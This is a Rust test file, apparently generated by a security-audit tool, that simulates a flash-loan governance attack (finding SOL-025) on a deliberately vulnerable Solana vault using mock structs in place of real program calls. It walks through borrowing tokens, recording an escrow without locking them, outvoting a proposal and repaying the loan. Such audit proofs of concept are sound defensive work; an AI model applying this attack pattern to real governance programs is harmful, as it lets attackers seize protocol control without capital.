//! Auto-generated Exploit PoC by Solana Security Swarm
//! Finding: SOL-025 â€” Flash-Loan Governance Attack
//! Target: handle_create_voting_escrow + handle_vote_on_proposal (vulnerable-vault)
//! Impact: Attacker controls governance without risk capital
//!
//! Attack: Escrow records amount without locking tokens â†’ attacker
//! can borrow tokens, set escrow, vote, return tokens in one tx.

#[test]
fn test_exploit_flash_loan_governance() {
    println!("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    println!("â•‘  SOL-025: Flash-Loan Governance Attack PoC      â•‘");
    println!("â•‘  Target: vulnerable_vault::create_voting_escrow  â•‘");
    println!("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();

    struct FlashLoanProvider {
        pool: u64,
    }
    impl FlashLoanProvider {
        fn borrow(&mut self, amount: u64) -> u64 {
            assert!(self.pool >= amount, "insufficient liquidity");
            self.pool -= amount;
            amount
        }
        fn repay(&mut self, amount: u64) {
            self.pool += amount;
        }
    }

    #[allow(dead_code)]
    struct VotingEscrow { owner: [u8; 32], amount: u64 }
    #[allow(dead_code)]
    struct Proposal { votes_for: u64, votes_against: u64, executed: bool }

    let mut flash_provider = FlashLoanProvider { pool: 100_000_000_000 };
    let attacker_initial_balance: u64 = 0; // attacker has ZERO tokens

    println!("[SETUP] Attacker token balance: {}", attacker_initial_balance);
    println!("[SETUP] Flash loan pool:        {} tokens", flash_provider.pool);
    println!();

    // Step 1: Flash-borrow 50 billion tokens
    let borrowed = flash_provider.borrow(50_000_000_000);
    println!("[STEP 1] Flash-borrowed {} tokens", borrowed);

    // Step 2: Create voting escrow â€” BUG: no actual token transfer happens
    let escrow = VotingEscrow {
        owner: [1u8; 32],
        amount: borrowed,  // Declared but not locked!
    };
    println!("[STEP 2] Created escrow with amount={} (no tokens locked!)", escrow.amount);

    // Step 3: Vote on proposal with massive weight
    let mut proposal = Proposal {
        votes_for: 1_000_000, // existing legitimate votes
        votes_against: 0,
        executed: false,
    };
    // Attacker votes against with 50 billion weight
    proposal.votes_against += escrow.amount;  // unchecked add
    println!("[STEP 3] Voted AGAINST with {} weight", escrow.amount);
    println!("         votes_for:     {}", proposal.votes_for);
    println!("         votes_against: {}", proposal.votes_against);

    // Step 4: Return flash loan â€” attacker never spent any capital
    flash_provider.repay(borrowed);
    println!("[STEP 4] Repaid flash loan â€” attacker cost: 0 tokens");
    println!();

    // Results
    let attacker_won = proposal.votes_against > proposal.votes_for;

    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!("âœ… EXPLOIT: Flash-Loan Governance Attack");
    println!("ğŸ—³ï¸  Proposal outcome: {}", if attacker_won { "REJECTED (attacker's goal)" } else { "PASSED" });
    println!("ğŸ’° Attacker capital at risk: 0 tokens");
    println!("âš¡ Attack vector: escrow amount set without token lock");
    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");

    assert!(attacker_won, "Attacker must control governance outcome");
    assert_eq!(flash_provider.pool, 100_000_000_000, "Flash loan fully repaid");
}
